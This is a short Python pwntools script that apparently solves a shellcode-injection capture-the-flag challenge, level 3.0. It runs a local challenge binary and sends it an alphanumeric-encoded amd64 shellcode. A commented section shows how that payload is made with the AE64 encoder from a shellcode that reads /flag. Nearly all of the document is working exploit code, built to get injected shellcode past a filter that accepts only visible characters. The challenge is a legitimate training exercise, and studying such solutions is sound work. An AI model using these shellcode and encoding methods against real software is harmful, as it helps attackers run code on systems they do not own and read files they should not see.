from pwn import *
# set 
context(arch="amd64", os="linux")
# excute
challenge_path = "/challenge/shellcode-injection-level3.0"
p = process(challenge_path)


shellcode = b'WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjfTYfi9420t800T810T820T830T840T850T860T870T880T8A0T8B0T8C0T8F0T8G0T8I0t8L0T8P0T8Q0t8S0t8T0t8U0t8V0t8Y0t8a0T8b0T8cRAPZ0t8M0t8O0T8W0t8ZZjOTYfi9MG0t800T840T8TRAPZ0T8UZRAQZ0T810T8QZHpTTTTTTTTPHpwgm5fTTTH1QqjWXHAg1vZPAr777OHAFjqXjToQZP'
p.sendafter("Do you understand the visible string shellcode?\n",shellcode)
result=p.recvall()
print(result)
p.interactive()

# python3 /home/hacker/si3.0.py
"""
#本地用AE64工具转化为可见字符串shellcode
from ae64 import AE64
from pwn import *
context(arch="amd64", os="linux")

# get bytes format shellcode
shellcode = asm(shellcraft.cat("/flag"))

# get alphanumeric shellcode
enc_shellcode = AE64().encode(shellcode)
print(enc_shellcode.decode('latin-1'))
"""